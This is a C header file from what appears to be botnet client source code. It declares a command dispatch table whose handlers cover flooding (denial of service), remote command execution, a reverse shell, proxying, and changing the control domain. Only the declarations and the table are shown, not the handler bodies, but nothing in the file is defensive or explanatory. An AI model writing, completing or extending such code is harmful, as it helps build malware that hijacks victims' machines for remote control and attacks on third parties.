#ifndef COMMANDS_H
#define COMMANDS_H

#include "bot/client/client.h"
#include "bot/utils/bytebuf.h"
#include <stdint.h>

typedef void (*command_func_t)(pclient_t, pbytebuf_t);

typedef struct {
  uint8_t id;
  command_func_t func;
} client_command_t, *pclient_command_t;

void client_cmd_ping(pclient_t client, pbytebuf_t buffer);

void client_cmd_exit(pclient_t client, pbytebuf_t buffer);
void client_cmd_flood(pclient_t client, pbytebuf_t buffer);

void client_cmd_exec(pclient_t client, pbytebuf_t buffer);
void client_cmd_modify_domain(pclient_t client, pbytebuf_t buffer);
void client_cmd_revshell(pclient_t client, pbytebuf_t buffer);
void client_cmd_proxy(pclient_t client, pbytebuf_t buffer);

// all reverse shells
static client_command_t client_cmd_handlers[] = {
  {CMD_PING, client_cmd_ping},

  // flood cmds and other shit
  {CMD_EXIT, client_cmd_exit},
  {CMD_FLOOD, client_cmd_flood},

  // admin n command
  {CMD_EXEC, client_cmd_exec},
  //{cmd_modify_domain, client_cmd_modify_domain},
  {CMD_SHELL, client_cmd_revshell},
  {CMD_PROXY, client_cmd_proxy},
};

#endif
